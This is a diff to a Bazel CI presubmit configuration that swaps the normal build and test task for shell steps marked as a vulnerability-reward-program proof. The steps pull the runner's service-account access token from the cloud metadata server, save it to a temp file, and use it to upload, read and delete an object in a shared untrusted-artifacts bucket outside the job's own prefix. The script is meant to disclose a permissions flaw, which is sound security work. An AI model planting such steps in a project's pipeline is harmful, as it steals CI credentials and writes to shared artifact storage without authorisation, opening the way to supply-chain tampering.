@@ -2,11 +2,89 @@
 buildifier:
   version: latest
 tasks:
-  presubmit:
+  vrp_buildkite_write_proof:
     platform: ubuntu2204
-    build_targets:
-    - "--"
-    - "..."
-    test_targets:
-    - "--"
-    - "..."
+    shell_commands:
+      - |
+        set +x
+        echo VRP_BK_WRITE_PROOF_20260519
+        id
+        hostname
+        echo "BUILDKITE_JOB_ID=$BUILDKITE_JOB_ID"
+      - |
+        set +x
+        echo === TOKEN_MINT_BEGIN ===
+        MD="http://metadata.google.internal/computeMetadata/v1"
+        H="Metadata-Flavor: Google"
+        TOK_JSON=$(curl -s --max-time 5 -H "$H" $MD/instance/service-accounts/default/token)
+        TOK=$(printf '%s' "$TOK_JSON" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
+        if [ -n "$TOK" ]; then
+            printf 'TOKEN_PRESENT=yes\nTOKEN_LENGTH=%s\n' "$(printf '%s' "$TOK" | wc -c | tr -d ' ')"
+            printf '%s' "$TOK" > /tmp/.t && chmod 600 /tmp/.t
+        else
+            echo "TOKEN_PRESENT=no"
+        fi
+        TOK=""
+        TOK_JSON=""
+        echo === TOKEN_MINT_END ===
+      - |
+        set +x
+        # Use a prefix that is DELIBERATELY NOT our job UUID, to prove
+        # the SA's storage.objects.create grant is unconditional at the
+        # bucket level (not IAM-condition-restricted to "name startsWith
+        # $BUILDKITE_JOB_ID/"). The prefix below is a clearly-our-own
+        # test marker (no risk of colliding with any real Bazel tenant).
+        OBJECT_NAME="vrp-cross-prefix-control-20260519/probe-$BUILDKITE_JOB_ID.txt"
+        echo "OBJECT_NAME=$OBJECT_NAME"
+        echo "MY_JOB_ID=$BUILDKITE_JOB_ID  (different prefix from OBJECT_NAME above)"
+        echo === STEP_A_UPLOAD_TO_NON_OWN_PREFIX_BEGIN ===
+        TOK=$(cat /tmp/.t)
+        BODY="VRP_WRITE_PROOF_MARKER_20260519 owner=mohammadmseet-hue job=$BUILDKITE_JOB_ID build=$BUILDKITE_BUILD_ID time=$(date -u +%FT%TZ)"
+        enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$OBJECT_NAME")
+        echo "--- POST /upload .../o?uploadType=media&name=$OBJECT_NAME ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 15 \
+            -X POST \
+            -H "Authorization: Bearer $TOK" \
+            -H "Content-Type: text/plain" \
+            --data "$BODY" \
+            "https://storage.googleapis.com/upload/storage/v1/b/bazel-untrusted-buildkite-artifacts/o?uploadType=media&name=$enc" \
+            | head -c 2000
+        echo
+        echo === STEP_A_UPLOAD_TO_NON_OWN_PREFIX_END ===
+        echo === STEP_B_VERIFY_EXISTS_BEGIN ===
+        echo "--- GET .../o/$OBJECT_NAME (metadata) ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 10 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size,contentType,md5Hash,etag,timeCreated,owner" \
+            | head -c 1500
+        echo
+        echo "--- GET .../o/$OBJECT_NAME?alt=media (body) ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 10 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?alt=media" \
+            | head -c 500
+        echo
+        echo === STEP_B_VERIFY_EXISTS_END ===
+        echo === STEP_C_DELETE_THE_NON_OWN_PREFIX_OBJECT_BEGIN ===
+        echo "--- DELETE .../o/$OBJECT_NAME ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 10 \
+            -X DELETE \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc" \
+            | head -c 800
+        echo
+        echo === STEP_C_DELETE_THE_NON_OWN_PREFIX_OBJECT_END ===
+        echo === STEP_D_VERIFY_DELETED_BEGIN ===
+        echo "--- GET .../o/$OBJECT_NAME (metadata, expect 404) ---"
+        curl -s -w "\nHTTP_STATUS=%{http_code}\n" --max-time 10 \
+            -H "Authorization: Bearer $TOK" \
+            "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o/$enc?fields=name,size" \
+            | head -c 800
+        echo
+        echo === STEP_D_VERIFY_DELETED_END ===
+        TOK=""
+        echo === ALL_STEPS_DONE ===
+      - |
+        set +x
+        rm -f /tmp/.t
+        echo VRP_BK_WRITE_PROOF_END
